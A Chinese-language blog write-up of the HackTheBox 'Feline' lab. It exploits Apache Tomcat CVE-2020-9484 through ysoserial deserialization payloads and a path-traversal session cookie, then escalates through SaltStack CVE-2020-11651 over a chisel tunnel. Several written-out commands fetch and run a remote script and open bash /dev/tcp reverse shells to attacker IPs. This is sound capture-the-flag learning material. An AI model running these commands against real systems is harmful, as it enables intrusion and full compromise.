---
layout:     post
title:      HackTheBox Feline
subtitle:   HackTheBox
date:       2021-02-04
author:     heria
header-img: img/post-bg-swift.jpg
catalog: true
tags:
---



![image-20210325182701508](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210325182701508.png)



## 0X01CherryTree简介

CherryTree在kali内自带

![image-20210325182751781](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210325182751781.png)



类似markdown，用于做笔记

![image-20210325182808351](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210325182808351.png)

## 0X02渗透

![image-20210325182834919](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210325182834919.png)



-sC： 等价于–script=default，使用默认类别的脚本进行扫描 可更换其他类别

-sV  打开版本探测

-A同时打开操作系统探测和版本探测。

检测到开放22和8080端口

8080 ApacheTomcat 9.0.27

访问8080，virusBucket 发现上传点

![image-20210204165516800](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204165516800.png)

bp抓包 上传点/upload.jsp 更改上传文件名后报错，显示上传目录名

![image-20210204165601035](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204165601035.png)

搜索apache tomcat 9.0.27漏洞

**CVE-2020-9484** 

![image-20210204165819590](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204165819590.png)

https://www.cybersecurity-help.cz/vdb/SB2020052124

https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/

![image-20210204170307853](C:\Users\Heria.Chen.GAIAWORKS\AppData\Roaming\Typora\typora-user-images\image-20210204170307853.png)

首先创建反弹shell的payload 

![image-20210204170601645](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204170601645.png)



之后创建序列化session文件（使用curl下载payload）和另外一个序列化session文件(执行payload)

从https://github.com/frohoff/ysoserial

![image-20210204170737690](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204170737690.png)

下载ysoserial反序列化工具

java -jar yso... 查看用法

![image-20210204170851836](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204170851836.png)

java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'curl http://10.10.15.64/reverse.sh -o /tmp/reverse.sh' >downloadpayload.sh    （用来下载）

java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'bash /tmp/reverse.sh' >executepayload.sh (用来执行)

![image-20210204171546222](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204171546222.png)

创建一个curlcommands.sh文件 执行带有cookie和恶意代码的curl指令

文件内容

curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/downloadpayload' -F 'image=@downloadpayload.session'
sleep 1
curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executepayload' -F 'image=@executepayload.session'

![image-20210204171708812](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204171708812.png)

python 开启http服务，nc监听   bash执行curlcommand脚本

![image-20210204172143924](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204172143924.png)

拿到tomcat权限

![image-20210204172309822](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204172309822.png)

![image-20210204172505614](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204172505614.png)

netstat -ntulp 发现开放4505，4506端口

![image-20210204172619272](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204172619272.png)

搜索发现为saltstack应用

继续搜索saltstack漏洞

 CVE-2020-11651 查找poc

![image-20210204172745247](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204172745247.png)

https://github.com/jasperla/CVE-2020-11651-poc

（exploit.py 需要salt模块，需要pip3下载）

python3 exploit.py 发现作用在127.0.0.1:4505上，直接上传利用失败(module not found on the target system)，因此使用chisel建立tcp tunnel(use reverse portforwarding on prot 4506 to run exploit locally)

https://github.com/jpillora/chisel

依然通过python 开启http，目标端tomcat shell 执行curl下载

![image-20210204173634802](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204173634802.png)

chmod 加执行权限

客户端服务端分别启动，

![image-20210204173945157](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204173945157.png)

此时再次执行CVE-2020-11651/exploit.py 

![image-20210204174128307](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204174128307.png)

python3 exploit.py --help 查询指令 ![image-20210204174222116](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204174222116.png)



使用--exec参数执行反弹shell 成功弹回root权限

python3 exploit.py --master 127.0.0.1 --exec 'bash -c "bash -i >& /dev/tcp/10.10.15.68/7878 0>&1"'

![image-20210204174549490](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204174549490.png)



通过cat .bash_history，发现

curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

![image-20210204180124213](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20210204180124213.png)

后续利用docker.sock漏洞暂时未触及

## 0x03参考链接

https://www.youtube.com/watch?v=2fn65MrXJ8o&t=313s

https://www.youtube.com/channel/UCh35oGf3_djXJbJVZ1KJ40g